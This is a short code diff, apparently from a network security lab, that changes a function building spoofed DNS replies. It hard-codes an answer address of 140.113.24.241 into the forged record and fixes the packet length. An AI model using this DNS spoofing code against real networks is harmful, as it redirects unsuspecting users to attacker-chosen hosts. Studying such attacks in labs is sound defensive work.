@@ -420,11 +420,13 @@ void send_spoofed_dns_reply(char *packet)
     answer->class_ = htons(1);
     answer->ttl = htonl(5);
     answer->rdlength = htons(4);
-    // answer->rdata = inet_addr("140.113.24.241");
-
+    // derive the rdata
+    unsigned char ip[4] = {140, 113, 24, 241};
+    memcpy(dns_query + sizeof(answer_section), ip, 4);
+    // cout << "Position of answer: " << answer - packet << endl;
 
     // calculate total length  
-    int total_len = (dns_query - packet) + sizeof(answer_section);
+    int total_len = (dns_query - packet) + sizeof(answer_section) + 4;
     // cout << "Total length: " << total_len << endl;
     udp_header->len = htons(total_len - ip_header->ihl * 4);
     ip_header->tot_len = htons(total_len);
